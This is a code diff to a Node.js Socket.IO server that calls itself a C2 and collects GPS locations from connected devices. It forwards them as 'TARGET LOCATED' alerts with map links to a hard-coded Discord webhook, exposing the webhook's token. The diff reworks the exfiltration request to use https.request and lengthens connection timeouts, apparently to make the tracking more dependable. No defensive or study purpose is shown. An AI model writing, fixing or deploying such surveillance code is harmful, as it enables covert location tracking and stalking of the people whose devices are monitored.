@@ -9,8 +9,8 @@ const cors = require('cors');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-    pingInterval: 10000,
-    pingTimeout: 5000,
+    pingInterval: 60000,
+    pingTimeout: 120000,
     cors: { origin: '*' }
 });
 
@@ -83,23 +83,44 @@ io.on('connection', (socket) => {
     });
 
     // Relay location data back to admins and Discord Webhook
-    socket.on('location_update', async (data) => {
+    socket.on('location_update', (data) => {
         io.to('admins').emit('location_result', data);
         
         // Push payload to Discord Webhook
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8"; 
         if (!data.error) {
             try {
-                // Find device ID for context
-                const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
+                const https = require('https');
+                const url = require('url');
                 
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**TARGET LOCATED:** ${subId}\n**GPS Map Link:** ${data.mapUrl}`
-                    })
+                const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
+                const payload = JSON.stringify({
+                    content: `**TARGET LOCATED:** ${subId}\n**GPS Map Link:** ${data.mapUrl}`
                 });
+
+                const parsedUrl = url.parse(DISCORD_WEBHOOK_URL);
+                const options = {
+                    hostname: parsedUrl.hostname,
+                    port: 443,
+                    path: parsedUrl.path,
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Content-Length': Buffer.byteLength(payload)
+                    }
+                };
+
+                const req = https.request(options, (res) => {
+                    console.log(`[C2] Webhook Status: ${res.statusCode}`);
+                });
+
+                req.on('error', (e) => {
+                    console.error(`[C2] Problem with Discord Webhook: ${e.message}`);
+                });
+
+                req.write(payload);
+                req.end();
+
             } catch (err) {
                 console.error("[C2] Failed to post GPS to Discord:", err.message);
             }
